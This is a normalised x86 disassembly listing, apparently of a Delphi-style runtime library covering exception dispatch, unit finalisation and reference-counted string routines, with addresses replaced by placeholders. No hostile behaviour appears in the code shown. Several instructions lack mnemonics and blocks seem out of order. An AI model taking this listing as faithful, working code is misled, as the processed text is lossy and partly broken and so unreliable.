push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_3a6481c
test ecx ecx
je r-xdata
retn
mov eax [ ecx + 0x1 ]
cmp [ ecx ] 0xe9
je r-xdata
add ecx 0x5
cmp [ ecx ] 0xeb
jne r-xdata
movsx eax al
inc ecx
inc ecx
jmp r-xdata
add ecx eax
sub_3a6483c
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push edx
push ecx
call sub_3a6481c
push ecx
push esp
push 0x1
push 0x0
push 0xeedfae1
call [ rw-data ]
pop ecx
pop ecx
pop edx
pop eax
sub_3a648a0
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
cld
call sub_3a6423c
mov edx [ rw-data ]
test edx edx
je r-xdata
or [ eax + 0x4 ] 0x2
push ebx
xor ebx ebx
push esi
push edi
push ebp
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
mov edi [ esp + 0x28 ]
call sub_3a672cc
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ edi + 0x4 ] r-xdata
add ebx 0x5
call sub_3a64808
jmp ebx
cmp [ rw-data ] 0x0
ja r-xdata
call edx
test eax eax
je r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0xeefface
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
call sub_3a647b8
cmp [ rw-data ] 0x0
jbe r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
sub_3a649cc
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
je r-xdata
mov eax [ eax + 0x18 ]
mov eax [ eax ]
cld
call sub_3a6423c
mov edx [ rw-data ]
test edx edx
je r-xdata
mov eax [ esp + 0x14 ]
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
mov edi ebp
jmp r-xdata
call edx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
call [ rw-data ]
mov edx [ esp + 0x1c ]
call sub_3a647b8
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax [ eax ]
cmp eax edi
je r-xdata
mov edx [ esp + 0x8 ]
push ebx
push esi
push edi
push ebp
mov ecx [ edx + 0x4 ]
mov ebx [ ecx + 0x5 ]
lea esi [ ecx + 0x9 ]
mov ebp eax
jmp r-xdata
xor ebx ebx
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
or [ eax + 0x4 ] 0x2
push esi
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
pop ebx
mov edi [ esp + 0x28 ]
call sub_3a672cc
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov [ edi + 0x4 ] r-xdata
mov eax [ esp + 0x8 ]
call sub_3a647f4
jmp [ ebx + 0x4 ]
cmp [ rw-data ] 0x0
ja r-xdata
mov edx eax
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
mov ecx [ eax - 0x28 ]
cmp ecx [ edi - 0x28 ]
jne r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edi [ edi - 0x24 ]
mov eax [ esi ]
test edi edi
jne r-xdata
mov eax [ eax - 0x2c ]
mov edx [ edi - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
mov edi [ edi ]
add esi 0x8
dec ebx
jne r-xdata
inc eax
inc edx
call sub_3a639d4
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
jmp r-xdata
sub_3a64b54
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
je r-xdata
mov eax 0x1
retn
push ebx
xor ebx ebx
push esi
push edi
push ebp
push ebp
push sub_3a64bd4
push [ fs : ebx ]
mov [ fs : ebx ] esp
mov ebx [ fs : ebx ]
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
push ebx
push eax
push edx
push ecx
mov edi [ esp + 0x34 ]
call sub_3a672cc
push [ eax ]
mov [ eax ] esp
mov ecx [ edi + 0x4 ]
mov ebp [ edi + 0x8 ]
mov [ edi + 0x4 ] sub_3a64bd4
add ecx 0x5
call sub_3a6483c
call ecx
call sub_3a672cc
mov ecx [ eax ]
mov edx [ ecx ]
mov [ eax ] edx
add esp 0x14
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
pop ebp
pop edi
pop esi
pop ebx
jmp r-xdata
sub_3a64bd4
jmp r-xdata
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test [ eax + 0x4 ] 0x6
je r-xdata
mov eax 0x1
retn
mov ecx [ edx + 0x4 ]
mov [ edx + 0x4 ] r-xdata
push ebx
push esi
push edi
push ebp
mov ebp [ edx + 0x8 ]
add ecx 0x5
call sub_3a6483c
call ecx
pop ebp
pop edi
pop esi
pop ebx
sub_3a64c34
or eax eax
jne r-xdata
pop edx
push esp
push ebp
push edi
push esi
push ebx
push eax
push edx
push esp
push 0x7
push 0x1
push 0xeedfade
push edx
jmp [ rw-data ]
mov eax 0xd8
call sub_3a651e0
sub_3a64c5c
mov eax [ esp + 0x30 ]
mov [ eax + 0x4 ] r-xdata
call sub_3a672cc
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0xc ]
and [ eax + 0x4 ] 0xfffffffd
cmp [ eax ] 0xeedfade
je r-xdata
xor eax eax
add esp 0x14
mov edx [ fs : eax ]
pop ecx
mov edx [ edx ]
mov [ ecx ] edx
pop ebp
pop edi
pop esi
pop ebx
mov eax 0x1
retn
mov eax [ edx + 0x8 ]
call sub_3a64380
call sub_3a6479c
sub_3a64cb0
call sub_3a672cc
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0x8 ]
call sub_3a64380
pop edx
mov esp [ esp + 0x2c ]
xor eax eax
pop ecx
mov [ fs : eax ] ecx
pop eax
pop ebp
call sub_3a64864
jmp edx
sub_3a64cf8
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0xcf
jmp r-xdata
cmp eax 0xc000008e
jg r-xdata
mov al 0xca
jmp r-xdata
sub eax 0x3d
je r-xdata
mov al 0xda
jmp r-xdata
sub eax 0xc0000093
je r-xdata
movzx eax al
mov edx [ edx + 0xc ]
call sub_3a62fd8
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd9
jmp r-xdata
jmp r-xdata
mov al 0xce
jmp r-xdata
dec eax
je r-xdata
je r-xdata
mov al 0xc8
jmp r-xdata
sub eax 0xc0000005
je r-xdata
mov al 0xff
mov al 0xc8
jmp r-xdata
dec eax
je r-xdata
mov al 0xcd
jmp r-xdata
jmp r-xdata
mov al 0xd8
jmp r-xdata
sub eax 0x87
je r-xdata
mov al 0xd7
jmp r-xdata
jmp r-xdata
mov al 0xc9
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
sub_3a64e58
xor edx edx
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
mov ecx [ fs : edx ]
cmp eax ecx
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
mov eax [ eax ]
mov [ fs : edx ] eax
retn
cmp [ ecx ] eax
jne r-xdata
mov ecx [ ecx ]
mov eax [ eax ]
mov [ ecx ] eax
sub_3a64e80
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ebx [ rw-data ]
mov edi [ eax + 0x4 ]
xor eax eax
push ebp
push sub_3a64ec9
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec ebx
mov [ rw-data ] ebx
mov esi [ edi + ebx * 8 + 0x4 ]
test esi esi
je r-xdata
test ebx ebx
jg r-xdata
call esi
sub_3a64ee4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov edi [ eax ]
xor ebx ebx
mov eax [ eax + 0x4 ]
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3a64f31
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + ebx * 8 ]
inc ebx
mov [ rw-data ] ebx
test esi esi
je r-xdata
cmp edi ebx
jg r-xdata
call esi
sub_3a64f8c
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add edx ebx
call sub_3a67194
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_3a64fb4
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add eax [ esi + 0x8 ]
mov [ edx + ebx ] eax
add esi 0xc
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_3a64fd8
push ebx
push esi
push edi
mov edi rw-data
mov bl 0x10
mov esi [ rw-data ]
mov eax esi
mov ecx 0xa
cdq
idiv ecx
add dl 0x30
movzx eax bl
mov [ edi + eax ] dl
mov ecx 0xa
mov eax esi
cdq
idiv ecx
mov esi eax
dec ebx
test esi esi
jne r-xdata
mov bl 0x1c
mov esi [ rw-data ]
mov eax esi
and eax 0xf
movzx eax [ eax + rw-data ]
movzx edx bl
mov [ edi + edx ] al
mov ecx 0x10
mov eax esi
xor edx edx
div ecx
mov esi eax
dec ebx
test esi esi
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_3a6503c
xor eax eax
xchg [ rw-data ] eax
neg eax
sbb eax eax
inc eax
mov edi rw-data
mov ebx [ edi + 0x18 ]
mov ebp [ edi + 0x14 ]
push [ edi + 0x1c ]
push [ edi + 0x20 ]
mov esi [ edi ]
mov ecx 0xb
[ edi ] [ esi ]
pop edi
pop esi
leave
retn 0xc
sub_3a6506c
push ecx
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0xd7b2
jne r-xdata
pop edx
retn
push 0x0
push rw-data
push rw-data
push 0x0
call sub_3a6129c
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x1e
push rw-data
push 0xfffffff5
call sub_3a61234
push eax
call sub_3a6126c
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff5
call sub_3a61234
push eax
call sub_3a6126c
pop edx
retn
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax rw-data
call [ rw-data ]
sub_3a650f8
push ebx
push esi
push edi
push ebp
mov ebx rw-data
mov edi rw-data
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp [ ebx + 0x28 ] 0x2
jne r-xdata
call sub_3a64fd8
call sub_3a6506c
xor eax eax
mov [ rw-data ] eax
mov eax [ edi ]
mov esi eax
xor eax eax
mov [ edi ] eax
call esi
cmp [ edi ] 0x0
jne r-xdata
call sub_3a64e80
cmp [ ebx + 0x28 ] 0x1
jbe r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov edi [ ebx + 0x10 ]
test edi edi
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
call sub_3a64e58
cmp [ ebx + 0x28 ] 0x1
jne r-xdata
mov eax edi
call sub_3a66c44
mov ebp [ ebx + 0x10 ]
mov esi [ ebp + 0x10 ]
cmp esi [ ebp + 0x4 ]
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
call [ ebx + 0x24 ]
test esi esi
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
call sub_3a6503c
push esi
call sub_3a612b4
mov eax [ ebx ]
mov esi eax
mov edi ebx
mov ecx 0xb
[ edi ] [ esi ]
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call ExitProcess
call [ rw-data ]
sub_3a651ec
push ebp
mov ebp esp
call sub_3a6423c
push ebp
xor ecx ecx
push r-xdata
mov edx [ fs : ecx ]
push edx
mov [ fs : ecx ] esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
push ecx
push edx
call sub_3a62efc
pop edx
pop eax
call edx
xor edx edx
pop ecx
mov [ fs : edx ] ecx
pop ecx
pop ebp
pop ebp
retn 0x4
sub_3a65224
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x10 ]
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x8
call sub_3a62ee0
mov [ eax ] ebx
mov [ eax + 0x4 ] esi
mov edx esi
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov [ rw-data ] 0x1
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp + 0xc ]
push edx
push eax
mov eax sub_3a651ec
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call sub_3a61284
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_3a652a0
mov edx [ eax ]
test edx edx
je r-xdata
retn
mov [ eax ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
jne r-xdata
push eax
lea eax [ edx - 0x8 ]
call sub_3a62efc
pop eax
sub_3a652c4
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_3a62efc
sub_3a652f4
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jg r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
push eax
push edx
mov eax [ edx - 0x4 ]
call sub_3a65364
mov edx eax
pop eax
push edx
mov ecx [ eax - 0x4 ]
call sub_3a63154
pop edx
pop eax
jmp r-xdata
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_3a62efc
sub_3a65338
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jle r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_3a62efc
sub_3a65364
test eax eax
jle r-xdata
xor eax eax
retn
push eax
add eax 0xa
and eax 0xfffffffe
push eax
call sub_3a62ee0
pop edx
mov [ edx + eax - 0x2 ] 0x0
add eax 0x8
pop edx
mov [ eax - 0x4 ] edx
mov [ eax - 0x8 ] 0x1
retn
sub_3a65390
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax edi
call sub_3a65364
mov ecx edi
mov edi eax
test esi esi
je r-xdata
mov eax ebx
call sub_3a652a0
mov [ ebx ] edi
pop edi
pop esi
pop ebx
retn
mov edx eax
mov eax esi
call sub_3a63154
sub_3a653c0
push ebp
mov ebp esp
push 0x0
push 0x0
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call WideCharToMultiByte
pop ebp
retn 0x4
sub_3a653e0
push ebp
mov ebp esp
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call sub_3a61324
pop ebp
retn 0x4
sub_3a653fc
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_3a652a0
jmp r-xdata
mov ebx ebp
add ebx ebx
mov eax edi
mov edx ebx
call sub_3a659c0
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_3a653c0
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0xfff
call sub_3a653c0
mov ebx eax
test ebx ebx
jl r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_3a659c0
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_3a65390
jmp r-xdata
sub_3a65498
xor ecx ecx
test edx edx
je r-xdata
jmp sub_3a65390
push edx
mov ecx edx
pop edx
sub ecx edx
cmp cl [ edx + 0x1 ]
je r-xdata
inc edx
cmp cl [ edx + 0x2 ]
je r-xdata
inc edx
cmp cl [ edx + 0x3 ]
je r-xdata
inc edx
add edx 0x4
jmp r-xdata
cmp cl [ edx ]
je r-xdata
sub_3a654c8
xor ecx ecx
test edx edx
je r-xdata
jmp sub_3a653fc
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_3a65510
push edi
push eax
push ecx
mov edi edx
xor eax eax
[ edi ]
jne r-xdata
pop eax
add ecx eax
pop eax
pop edi
jmp sub_3a65390
not ecx
sub_3a6553c
push ebx
test edx edx
je r-xdata
mov [ eax ] 0x0
pop ebx
retn
mov ebx [ edx - 0x4 ]
test ebx ebx
je r-xdata
cmp ecx ebx
jl r-xdata
mov [ eax ] cl
inc eax
xchg edx eax
call sub_3a63154
pop ebx
retn
mov ecx ebx
sub_3a6556c
test edx edx
je r-xdata
retn
mov ecx [ eax ]
test ecx ecx
je sub_3a652f4
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi [ ecx - 0x4 ]
mov edx [ esi - 0x4 ]
add edx edi
jo r-xdata
jmp r-xdata
cmp esi ecx
je r-xdata
mov al 0x5
jmp sub_3a63030
call sub_3a659c0
mov eax [ ebx ]
mov ecx edi
jmp r-xdata
call sub_3a659c0
mov eax esi
mov ecx [ esi - 0x4 ]
mov edx [ ebx ]
add edx edi
call sub_3a63154
pop edi
pop esi
pop ebx
retn
sub_3a655b8
test edx edx
je r-xdata
mov edx ecx
jmp sub_3a652f4
test ecx ecx
je sub_3a652f4
cmp edx [ eax ]
je r-xdata
mov edx ecx
jmp sub_3a6556c
cmp ecx [ eax ]
je r-xdata
push ebx
push esi
push edi
mov ebx edx
mov esi ecx
push eax
mov eax [ ebx - 0x4 ]
add eax [ esi - 0x4 ]
jo r-xdata
push eax
push ecx
call sub_3a652f4
pop edx
pop eax
jmp sub_3a6556c
jmp r-xdata
call sub_3a65364
mov edi eax
mov edx eax
mov eax ebx
mov ecx [ ebx - 0x4 ]
call sub_3a63154
mov edx edi
mov eax esi
mov ecx [ esi - 0x4 ]
add edx [ ebx - 0x4 ]
call sub_3a63154
pop eax
mov edx edi
test edi edi
je r-xdata
mov al 0x5
jmp sub_3a63030
call sub_3a652f4
pop edi
pop esi
pop ebx
retn
dec [ edi - 0x8 ]
sub_3a65634
push ebx
push esi
push edi
push edx
push eax
mov ebx edx
xor edi edi
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
xor eax eax
cmp [ eax ] ecx
jne r-xdata
dec edx
jne r-xdata
add eax [ ecx - 0x4 ]
jo r-xdata
mov edi ecx
mov eax [ ecx - 0x4 ]
dec edx
jmp r-xdata
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
test edi edi
je r-xdata
jmp r-xdata
cmp edi ecx
jne r-xdata
call sub_3a65364
push eax
mov esi eax
mov edx eax
mov eax [ esp ]
mov esi [ edi - 0x4 ]
call sub_3a659c0
mov edi [ esp ]
push [ edi ]
add esi [ edi ]
dec ebx
jmp r-xdata
mov al 0x5
jmp sub_3a63030
xor edi edi
dec ebx
jne r-xdata
mov ecx [ eax - 0x4 ]
add esi ecx
call sub_3a63154
mov eax [ esp + ebx * 4 + 0x18 ]
mov edx esi
test eax eax
je r-xdata
pop edx
pop eax
test edi edi
jne r-xdata
pop edx
pop edi
pop esi
pop ebx
pop eax
lea esp [ esp + edx * 4 ]
jmp eax
test edx edx
je r-xdata
call sub_3a652f4
dec [ edx - 0x8 ]
sub_3a656c8
cmp eax edx
je r-xdata
retn
test eax edx
je r-xdata
test eax eax
je r-xdata
movzx ecx [ eax ]
sub cl [ edx ]
jne r-xdata
cmp eax [ edx - 0x4 ]
retn
test edx edx
jne r-xdata
push ebx
mov ebx [ eax - 0x4 ]
sub ebx [ edx - 0x4 ]
push ebx
adc ecx 0xffffffff
and ecx ebx
sub ecx [ eax - 0x4 ]
sub eax ecx
sub edx ecx
cmp [ eax - 0x4 ] edx
retn
bsf ebx ebx
shr ebx 0x3
add ecx ebx
jns r-xdata
add ecx 0x4
js r-xdata
pop eax
add eax eax
pop ebx
mov al [ ecx + eax ]
cmp al [ ecx + edx ]
pop ebx
pop ebx
retn
mov ebx [ ecx + eax ]
xor ebx [ ecx + edx ]
jne r-xdata
sub_3a65744
mov edx [ eax ]
test edx edx
je r-xdata
mov eax edx
retn
mov ecx [ edx - 0x8 ]
dec ecx
je r-xdata
push ebx
mov ebx eax
mov eax [ edx - 0x4 ]
call sub_3a65364
mov edx eax
mov eax [ ebx ]
mov [ ebx ] edx
push eax
mov ecx [ eax - 0x4 ]
call sub_3a63154
pop eax
mov ecx [ eax - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
pop ebx
[ eax - 0x8 ]
jne r-xdata
lea eax [ eax - 0x8 ]
call sub_3a62efc
sub_3a65798
push ebx
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
call sub_3a652a0
mov ebx [ eax - 0x4 ]
test ebx ebx
je r-xdata
dec edx
jl r-xdata
xor edx edx
jmp r-xdata
cmp edx ebx
jge r-xdata
sub ebx edx
test ecx ecx
jl r-xdata
cmp ecx ebx
jg r-xdata
mov ecx ebx
jmp r-xdata
add edx eax
mov eax [ esp + 0x8 ]
call sub_3a65390
jmp r-xdata
pop ebx
retn 0x4
sub_3a657d8
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
call j_sub_3a65744
mov edx [ ebx ]
test edx edx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ edx - 0x4 ]
dec esi
jl r-xdata
cmp esi ecx
jge r-xdata
test edi edi
jle r-xdata
sub ecx esi
cmp edi ecx
jle r-xdata
sub ecx edi
add edx esi
lea eax [ edi + edx ]
call sub_3a63154
mov edx [ ebx ]
mov eax ebx
mov edx [ edx - 0x4 ]
sub edx edi
call sub_3a659c0
mov edi ecx
sub_3a65820
test eax eax
je r-xdata
retn
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov edx [ edx ]
push edx
test edx edx
je r-xdata
dec edi
jge r-xdata
mov edx [ edx - 0x4 ]
cmp edi edx
jle r-xdata
xor edi edi
mov ebp [ ebx - 0x4 ]
mov eax esi
add edx ebp
call sub_3a659c0
pop eax
cmp eax ebx
jne r-xdata
mov edi edx
mov eax [ esi ]
lea edx [ edi + ebp ]
mov ecx [ eax - 0x4 ]
sub ecx edx
add edx eax
add eax edi
call sub_3a63154
mov eax ebx
mov edx [ esi ]
mov ecx ebp
add edx edi
call sub_3a63154
pop ebp
pop edi
pop esi
pop ebx
mov ebx [ esi ]
sub_3a6587c
push ebx
push esi
add esp 0xfffffff0
test edx edx
je r-xdata
xor eax eax
jmp r-xdata
test eax eax
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov esi [ edx - 0x4 ]
mov ebx [ eax - 0x4 ]
cmp esi ebx
jl r-xdata
test ebx ebx
jle r-xdata
dec ebx
add esi edx
add edx ebx
mov [ esp + 0x8 ] esi
add eax ebx
mov [ esp + 0x4 ] edx
neg ebx
movzx ecx [ eax ]
mov [ esp ] ebx
jne r-xdata
sub esi 0x2
mov [ esp + 0xc ] esi
sub esi 0x2
mov [ esp + 0xc ] esi
mov esi [ esp ]
cmp cl [ edx + 0x1 ]
je r-xdata
inc edx
mov eax edx
sub eax [ esp + 0x4 ]
cmp cl [ edx + 0x1 ]
je r-xdata
add esi 0x2
jl r-xdata
mov esi [ esp ]
add edx 0x2
cmp edx [ esp + 0xc ]
jb r-xdata
add edx 0x2
xor eax eax
cmp edx [ esp + 0x8 ]
ja r-xdata
add edx 0x2
cmp edx [ esp + 0xc ]
jb r-xdata
movzx ebx [ eax + esi ]
cmp bx [ edx + esi ]
jne r-xdata
inc edx
mov eax edx
sub eax [ esp + 0x4 ]
add esp 0x10
pop esi
pop ebx
retn
add esi 0x2
jl r-xdata
cmp cl [ edx ]
je r-xdata
cmp edx [ esp + 0x8 ]
jb r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax edx
sub eax [ esp + 0x4 ]
cmp cl [ edx ]
je r-xdata
cmp edx [ esp + 0x8 ]
jb r-xdata
movzx ebx [ eax + esi ]
cmp bx [ edx + esi + 0x1 ]
jne r-xdata
add edx 0x2
xor eax eax
cmp edx [ esp + 0x8 ]
ja r-xdata
cmp cl [ edx + 0x1 ]
je r-xdata
cmp cl [ edx ]
je r-xdata
xor eax eax
jmp r-xdata
cmp cl [ edx + 0x1 ]
je r-xdata
cmp cl [ edx ]
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax edx
sub eax [ esp + 0x4 ]
cmp cl [ edx + 0x2 ]
je r-xdata
cmp cl [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cl [ edx + 0x3 ]
je r-xdata
add edx 0x2
cmp cl [ edx + 0x3 ]
je r-xdata
add edx 0x2
add edx 0x4
cmp edx [ esp + 0xc ]
jb r-xdata
add edx 0x2
add edx 0x4
cmp edx [ esp + 0xc ]
jb r-xdata
cmp edx [ esp + 0x8 ]
jb r-xdata
cmp edx [ esp + 0x8 ]
jb r-xdata
xor eax eax
jmp r-xdata
xor eax eax
jmp r-xdata
sub_3a659c0
push ebx
push esi
push edi
mov ebx eax
mov esi edx
xor edi edi
test edx edx
jle r-xdata
mov eax ebx
call sub_3a652a0
mov [ ebx ] edi
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax edx
call sub_3a65364
mov edi eax
mov eax [ ebx ]
test eax eax
je r-xdata
cmp [ eax - 0x8 ] 0x1
jne r-xdata
mov edx edi
mov ecx [ eax - 0x4 ]
cmp ecx esi
jl r-xdata
sub eax 0x8
add edx 0x9
push eax
mov eax esp
call sub_3a62f14
pop eax
add eax 0x8
mov [ ebx ] eax
mov [ eax - 0x4 ] esi
mov [ esi + eax ] 0x0
jmp r-xdata
call sub_3a63154
mov ecx esi
pop edi
pop esi
pop ebx
retn
sub_3a65a2c
push ebx
mov ebx edx
mov edx ecx
xor ecx ecx
test ebx ebx
je r-xdata
push ecx
call sub_3a63d60
pop ecx
mov edx ebx
pop ebx
jmp sub_3a63d0c
mov ecx [ ebx - 0x4 ]
sub edx ecx
sub_3a65a94
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
push eax
call sub_3a6136c
mov eax [ ebx ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
sub_3a65ab8
cmp [ eax ] edx
je r-xdata
retn
test edx edx
je sub_3a65a7c
mov ecx [ edx - 0x4 ]
shr ecx 0x1
je sub_3a65a7c
push ecx
push edx
push eax
call SysReAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_3a63030
sub_3a65ae0
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
